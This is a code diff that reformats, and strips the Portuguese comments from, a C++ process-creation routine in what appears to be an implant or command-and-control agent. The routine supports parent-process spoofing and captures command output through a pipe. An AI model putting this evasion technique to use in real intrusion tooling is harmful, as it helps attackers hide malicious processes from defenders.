@@ -90,9 +90,7 @@ auto DECLFN Process::Create(
         if ( ! Success ) { goto _KH_END; }
     }
     
-    if ( AttrBuff ) {
-        SiEx.lpAttributeList = AttrBuff;
-    }
+    if ( AttrBuff ) { SiEx.lpAttributeList = AttrBuff; }
 
     if ( Self->Ps->Ctx.Pipe ) {
         Success = Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecurityAttr, 0 ); // Use 0 for default buffer
@@ -103,23 +101,16 @@ auto DECLFN Process::Create(
         SiEx.StartupInfo.hStdInput  = Self->Krnl32.GetStdHandle( STD_INPUT_HANDLE );
         SiEx.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;
 
-        // Se for processo com parent spoofing, duplicamos o handle
         if ( Self->Ps->Ctx.ParentID ) {
             Success = Self->Krnl32.DuplicateHandle(
-                NtCurrentProcess(), 
-                PipeWrite, 
-                PsHandle, 
-                &PipeDuplic, 
-                0,
-                TRUE, 
-                DUPLICATE_SAME_ACCESS
+                NtCurrentProcess(), PipeWrite, 
+                PsHandle, &PipeDuplic, 0, TRUE, DUPLICATE_SAME_ACCESS
             );
             
             if ( ! Success || !PipeDuplic || PipeDuplic == INVALID_HANDLE_VALUE ) { 
                 goto _KH_END; 
             }
             
-            // Fecha o handle original e usa o duplicado
             Self->Ntdll.NtClose( PipeWrite );
             PipeWrite = PipeDuplic;
             SiEx.StartupInfo.hStdError = PipeWrite;
@@ -128,12 +119,10 @@ auto DECLFN Process::Create(
     }
 
     Success = Self->Krnl32.CreateProcessA(
-        nullptr, CommandLine, nullptr, nullptr, TRUE, // IMPORTANTE: InheritHandles = TRUE
-        PsFlags,
+        nullptr, CommandLine, nullptr, nullptr, TRUE, PsFlags,
         nullptr, Self->Ps->Ctx.CurrentDir, &SiEx.StartupInfo, PsInfo
     );
 
-    // Fecha o handle de escrita APÓS criar o processo
     if ( PipeWrite ) {
         Self->Ntdll.NtClose( PipeWrite );
         PipeWrite = nullptr;
@@ -144,11 +133,9 @@ auto DECLFN Process::Create(
     }
 
     if ( Self->Ps->Ctx.Pipe ) {
-        // Espera o processo terminar
         DWORD waitResult = Self->Krnl32.WaitForSingleObject( PsInfo->hProcess, INFINITE );
         
         if ( waitResult == WAIT_OBJECT_0 ) {
-            // Lê o output do pipe
             Success = Self->Krnl32.PeekNamedPipe(
                 PipeRead, nullptr, 0, nullptr, (LPDWORD)&PipeBuffSize, nullptr
             );
@@ -161,7 +148,6 @@ auto DECLFN Process::Create(
                     );
                     
                     if ( Success ) {
-                        // Garante null termination para string
                         PipeBuff[TmpValue] = 0;
                         Self->Ps->Out.p = PipeBuff;
                         Self->Ps->Out.s = TmpValue;
